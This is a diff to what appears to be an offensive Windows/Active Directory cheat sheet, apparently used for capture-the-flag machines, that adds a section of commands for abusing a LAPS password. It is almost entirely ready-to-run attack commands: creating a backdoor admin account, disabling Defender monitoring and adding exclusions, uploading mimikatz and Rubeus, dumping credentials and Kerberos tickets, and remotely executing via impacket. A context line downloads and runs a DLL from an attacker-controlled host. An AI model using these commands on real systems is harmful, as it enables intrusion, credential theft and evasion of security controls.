@@ -1770,6 +1770,24 @@ impacket-atexec 'dbf':'123qweasdF!'@$TARGET 'C:\Windows\Tasks\mimikatz.exe "seku
 Invoke-Command -ComputerName SRV01 -ScriptBlock { C:\Windows\Tasks\mimikatz.exe "sekurlsa::logonpasswords" "privilege::debug" "token::elevate" "log" "lsadump::sam" "exit"}
 evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
 
++---------- LAPS (Execute Commands) ----------+
+$computer='WS02'; $pass='YwBxQ1hv'; Set-Item WSMan:\localhost\Client\TrustedHosts -Value $computer -Force -Confirm:$false; $sec=ConvertTo-SecureString $pass -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential("$computer\Administrator",$sec); Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { hostname; whoami; ipconfig /all }
+Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add }
+Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { New-SmbShare -Name tasks -Path "C:\Windows\Tasks" -FullAccess dbf }
+Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { Add-MpPreference -ExclusionPath "C:\Windows\Tasks" }
+Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true }
+Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
+impacket-secretsdump 'dbf':'123qweasdF!'@$TARGET
+nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
+nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Rubeus.exe Windows\\Tasks\\Rubeus.exe
+impacket-atexec 'dbf':'123qweasdF!'@$TARGET 'C:\Windows\Tasks\Rubeus.exe asreproast'
+impacket-atexec 'dbf':'123qweasdF!'@$TARGET 'C:\Windows\Tasks\Rubeus.exe kerberoast'
+impacket-atexec 'dbf':'123qweasdF!'@$TARGET 'C:\Windows\Tasks\Rubeus.exe dump /nowrap'
+impacket-atexec 'dbf':'123qweasdF!'@$TARGET 'C:\Windows\Tasks\Rubeus.exe tgtdeleg /nowrap'
+impacket-atexec 'dbf':'123qweasdF!'@$TARGET 'C:\Windows\Tasks\mimikatz.exe "sekurlsa::logonpasswords" "privilege::debug" "token::elevate" "log" "lsadump::sam" "exit"'
+Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { C:\Windows\Tasks\mimikatz.exe "sekurlsa::logonpasswords" "privilege::debug" "token::elevate" "log" "lsadump::sam" "exit" }
+evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
+
 +---------- SeBackupPrivilege ----------+
 $a = [System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$MYIP:53/windows/SeBackupPrivilegeUtils.dll')); Get-ChildItem C:\Users -Recurse -File -Include user.txt,root.txt | ForEach-Object {$d=Join-Path $env:TEMP "$([guid]::NewGuid()).txt"; [bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils]::CopyFile($_.FullName,$d,[ref]$true,$true)>$null; Get-Content $d; Remove-Item $d -Force}
 robocopy /b \users\administrator\desktop\ .; type \users\administrator\desktop\root.txt
